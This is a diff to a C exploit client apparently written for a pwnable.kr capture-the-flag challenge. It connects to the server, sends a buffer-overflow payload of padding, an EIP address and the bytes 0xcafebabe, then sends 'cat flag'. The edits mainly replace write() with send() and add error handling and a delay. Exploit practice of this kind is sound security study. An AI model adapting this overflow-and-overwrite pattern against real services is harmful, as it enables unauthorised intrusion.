@@ -45,7 +45,6 @@ s32 *RepeatChar(char a, int times)
 void *HandleMessage(void *arg)
 {
 	s32 *sentence = NULL;
-
 	while(isDone == false)
 	{
 		if (message.head != NULL)
@@ -89,7 +88,7 @@ int main()
 		s32 *payload = NULL;
 		s32 *aBuffer = NULL;
 		s32 *eipAddress = NULL;
-		s32 *theBeef = "\xbe\xba\xfe\xca";
+		s32 theBeef[5] = { 0xbe,0xba,0xfe,0xca};  // = "\xbe\xba\xfe\xca";
 		s32 *command = S32("cat flag\n");
 
 		printf("Connected to pwnable.kr\n");
@@ -99,11 +98,15 @@ int main()
 		
 		payload = S32Cat(aBuffer,3,eipAddress,theBeef,"\n");
 
-		printf("Sending payload...\n");
-		write(socket,payload,Strlen(payload));
+		printf("Sending payload..\n");
 
+		if (send(socket,payload,Strlen(payload),0) == -1)
+		{
+			printf("Error sending payload\n");
+		}
+		sleep(5);
 		printf("Capturing the flag...\n");
-		write(socket,command,Strlen(command));
+		send(socket,command,Strlen(command),0);
 		count = 69;
 		
 		while (count != 0 && isDone == false)
